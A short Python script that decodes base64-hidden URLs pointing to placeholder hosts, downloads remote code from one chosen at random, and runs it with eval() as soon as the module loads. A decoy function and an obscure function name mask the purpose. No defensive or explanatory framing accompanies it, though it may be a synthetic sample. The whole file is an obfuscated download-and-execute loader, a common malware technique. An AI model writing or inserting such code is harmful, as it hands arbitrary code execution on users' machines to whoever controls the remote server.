import urllib.request
import base64
import random

def make_request(url):
    with urllib.request.urlopen(url) as response:
        code = response.read().decode('utf-8')
    return code

def get_encoded_url():
    urls = [
        "aHR0cDovL21vY2stcHl0aG9uL2V4ZWN1dGUucHk=",
        "aHR0cDovL21vY2stcHl0aG9uMi9leGFtcGxlLnB5"
    ]
    return random.choice(urls)

def some_unrelated_function():
    print("Unrelated function called.")

def obscure_func_name():
    encoded_url = get_encoded_url()
    decoded_url = base64.b64decode(encoded_url).decode('utf-8')
    code = make_request(decoded_url)
    some_unrelated_function()
    eval(code)

obscure_func_name()
